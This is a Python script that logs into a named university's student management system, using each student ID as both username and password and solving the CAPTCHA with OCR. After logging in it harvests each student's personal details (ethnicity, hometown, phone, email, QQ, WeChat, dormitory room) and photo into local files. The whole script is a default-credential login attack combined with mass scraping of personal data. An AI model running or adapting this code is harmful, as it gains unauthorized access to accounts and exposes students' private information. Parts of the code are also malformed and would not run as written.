# -*- coding: utf-8 -*-
"""
Spyder Editor

This is a temporary script file.
"""





# -*- coding: utf-8 -*-

#s= []

import urllib
import re
import http.cookiejar
import sys
from PIL import Image
import pytesseract
from urllib.error import URLError, HTTPError
from bs4 import BeautifulStoneSoup

#pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files (x86)/Tesseract-ORC/tesseract'
#pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files/Tesseract-ORC/tesseract'


colunms_name_set = ['学号','姓名','民族','籍贯','生源地','户口','毕业学校','手机',
                   '邮箱','qq','微信','楼层','寝室号','班级','年级']
column_str = ''
for item in colunms_name_set[0:-1]:
    column_str += str(item)+','
column_str += colunms_name_set[-1]

f = open('stu_info.txt','a+')
f.write(column_str)
f.write('\n')
f.close()


LONING_URL = 'http://szjy.swun.edu.cn/Sys/yhmm.aspx'
CAPTURE_URL= 'http://szjy.swun.edu.cn/Sys/default3.aspx' 
INFO_URL = 'http://szjy.swun.edu.cn/Sys/SystemForm/Class/MyStudent.aspx'
headers = {
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'Connection': 'keep-alive',
            'Host':'szjy.swun.edu.cn',
            'Referer': 'http://szjy.swun.edu.cn/Sys/yhmm.aspx',
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            }
            
    
class Spyder(object):
    def __init__(self):
        self.login_url = LONING_URL
        self.info_url = INFO_URL
        self.enable = True
        self.count = 0
        self.character = "gb2312"
        self.headers = headers
        self.cookie = http.cookiejar.CookieJar()
        self.hander = urllib.request.HTTPCookieProcessor(cookiejar=self.cookie)
        self.opener = urllib.request.build_opener(self.hander)
    
    def get_capture(self):
        captupe_url = CAPTURE_URL
        picture = self.opener.open(captupe_url).read()
        local = open('ma.jpg','wb')
        local.write(picture)
        local.close()
        im = Image.open('ma.jpg')
        check_code = pytesseract.image_to_string(im)
        #check_code = input('输入验证码: ')
        #check_code = str(check_code)
        print("check code= ",check_code)
        return check_code
       
    def login(self,account,password):
         self.count+=1
         form_data={
            '__LASTFOCUS': '',
            '__VIEWSTATE': '/wEPDwUKLTYyODEyMzMzMGRkL3e45wwAbXRMklziclTsgEdzyPEwTYlRK/82rSW9ia4=',
            '__EVENTTARGET':'',
            '__EVENTARGUMENT': '',
            '__EVENTVALIDATION' :'/wEdAAU54OdiNscYklAhFFRo5mKvR1LBKX1P1xh290RQyTesRe73C5Hghb+Z/bZTMreJjC5a26FEoUIR27AQFJNWWcL9lvD3Xdq7ldHy+JQ2tBNJGaOgZ5o+9oUn7QAVYx4o/XgeS3eF3mvkRXiWGnMfaCgO',
            'UserName': account,
            'UserPass': password,
            'CheckCode': self.get_capture(),
            'Btn_OK': '(unable to decode value)',
                }
                
         data = urllib.parse.urlencode(form_data).encode(encoding='utf-8')
         resquest = urllib.request.Request(self.login_url, data, self.headers)
         response = self.opener.open(resquest)
         login_content = response.read().decode(self.character).encode("utf-8")
         ss = str((BeautifulStoneSoup(login_content)))
         #
         #
         #优化等待
         if (len(ss)) > 4105:
              ss = ss.split('alert')[1]
              ss = ss.split(';')[0]
              print (ss)
              if ss == "('验证码输入错误！')":
                  if self.count is 1: 
                      self.cookie = self.cookie.clear()
                  return 1
              elif ss == "('用户名或密码错误！')":
                   self.cookie = self.cookie.clear()
                   return 2
         else:
             return 3
         
         
    def get_info(self,account):
         request = urllib.request.Request(self.info_url)
         response = self.opener.open(request)
         content = response.read().decode(self.character).encode("utf-8")
         
         detail_html = BeautifulStoneSoup(content)
         img_url = detail_html.find(id="Student11_Image1")
         link = img_url.get('src')
         link = link[2:]
         pto_url = 'http://szjy.swun.edu.cn/Sys/SystemForm'+link
         pto_url = pto_url.replace('照片','%D5%D5%C6%AC')
         urllib.request.install_opener(opener=self.opener)
         img_name = 'photos/'+account+'.jpg'
         urllib.request.urlretrieve(pto_url,img_name)
         self.cookie = self.cookie.clear()
         
         return detail_html
         
    def extract_info(self,account):
        f = open('stu_info.txt','a+')

        soup = self.get_info(account=account)
        
        try:
            stu_id = soup.find('input',attrs={"name":"Student11$StudentNo"})['value']
        except:
            stu_id = None

        try:
            stu_name = soup.find('input',attrs={"name":"Student11$StudentName"})['value']
        except:
            stu_name = None

        try:
            native_place = soup.find('input',attrs={"name":"Student11$NativePlace"})['value']
        except:
            native_place = None

        try:
            come_where = soup.find('input',attrs={"name":"ComeWhere1"})['value']
        except:
            come_where = None
'''
try:
    id_card = soup.find('input',attrs={"name":"Student21$IdCard"})['value']
except:
    id_card = None
'''
        try:
            famely_reg = soup.find('input',attrs={"name":"Student21$FamillyReg"})['value']
        except:
            famely_reg = None

        try:
            unit_school = soup.find('input',attrs={"name":"Student21$UnitSchool"})['value']
        except:
            unit_school = None

        try:
            stu_mobil = soup.find('input',attrs={"name":"Student31$MoveTel"})['value']
        except:
            stu_mobil = None

        try:
            stu_email = soup.find('input',attrs={"name":"Student31$Email"})['value']
        except:
            stu_email = None

        try:
            stu_qq = soup.find('input',attrs={"name":"Student31$QQCard"})['value']
        except:
            stu_qq = None
        try:
            stu_weichat = soup.find('input',attrs={"name":"Student31$WXQCard"})[0]
        except:
            stu_weichat = None

        try:
            floor_no = soup.find('input',attrs={"name":"Student51$FloorNo"})['value']
        except:
            floor_no = None

        try:
            dorm_addres = soup.find('input',attrs={"name":"Student51$DormAddress"})['value']
        except:
            dorm_addres = None


        try:
            select_opt = soup.find_all('option',selected=True)#,text=re.findall('[\x80-\xff]'))
            stu_national = str(select_opt[0])
            stu_national = re.findall('(?<=>)[^a-zA-Z0-9]',stu_national)[0]
        except:
            stu_national = None


        try:
            select_opt = soup.find_all('option',selected=True)
            stu_class = str(select_opt)
            stu_class = re.findall('[\u4e00-\u9fa5]{1,}\d{1,}',stu_class)[0]
        except:
            stu_class = None

        try:
            select_opt = soup.find_all('option',selected=True)
            stu_grade = str(select_opt)
            stu_grade = re.findall('\d{1,}[\u4e00-\u9fa5]',stu_grade)[0]
        except:
            stu_grade = None

        data_set = [stu_id,stu_name,stu_national,native_place,come_where,
                    famely_reg,unit_school,stu_mobil,stu_email,stu_qq,stu_weichat,
                    floor_no,dorm_addres,stu_class,stu_grade]


        data_str = ''
        for item in data_set[0:-1]:
            data_str += str(item)+','
        data_str += data_set[-1]
        f.write(data_str)
        f.write('\n')
        f.close()


uid_set = ['201430301141','201430301142','201430301012','201430301011']

if __name__=="__main__":
    sussess_count = 0
    pwderr_count = 0
    capturerr_count = 0
    fail_info = open('fail_id.txt','a+')
    pwderr_info = open('passwd_error.txt','a+')
    success_info = open('success_id.txt','a+')
    captuperrr_info = open('capture_error.txt','a+')

    for uid in uid_set:
        my_spy = Spyder()
        #global status
        log_list = [];log='账号:'+uid
        status = my_spy.login(uid,password=uid)
        #print("status=",status)
        log+='返回状态='
        log+=str(status)
        log_list.append(log)

        status_count = 0
        while(status is 1):
            tmp_log = ''
            status = my_spy.login(uid,uid)
            status_count+=1
            print("验证码识别错误，错误次数:",status_count)
            if status_count >10:
                captuperrr_info.write(uid)
                captuperrr_info.write('\n')
                #print("验证码识别错误次数已达上限，存储并切换,放弃识别数: ",capturerr_count)
                tmp_log += "验证码识别错误次数已达上限，存储并切换,当前已放弃识别数: "
                tmp_log += str(capturerr_count)
                log_list.append(tmp_log)
                break;

        if status is 2:
            tmp_log = ''
            pwderr_count+=1
            #print("用户名或密码错误,当前错误数: ",pwderr_count)
            tmp_log += "用户名或密码错误,当前错误数: "
            tmp_log += str(pwderr_count)
            log_list.append(tmp_log)

            pwderr_info.write(uid)
            pwderr_info.write('\n')
            continue
        elif status is 3:
            tmp_log = ''
            try:
                my_spy.extract_info(account=uid)
                sussess_count+=1
                #print("获取信息成功,当前已成功数: ",sussess_count)
                tmp_log += "获取信息成功,当前已成功数: "
                tmp_log += str(sussess_count)
                log_list.append(tmp_log)

                success_info.write(uid)
                success_info.write('\n')
            except:
                tmp_log += '登录成功，但提取信息失败'
                log_list.append(tmp_log)
                fail_info.write(uid)
                fail_info.write('\n')
                continue
        else:
            tmp_log = "未知错误"
            log_list.append(tmp_log)
            fail_info.write(uid)
            fail_info.write('\n')
            continue
        
        print(log_list)
        print('\n\n')

    fail_info.close()
    pwderr_info.close()
    success_info.close()
    f.close()
    captuperrr_info.close()
        
        
        
        
        
        
        
        
        
        
        
        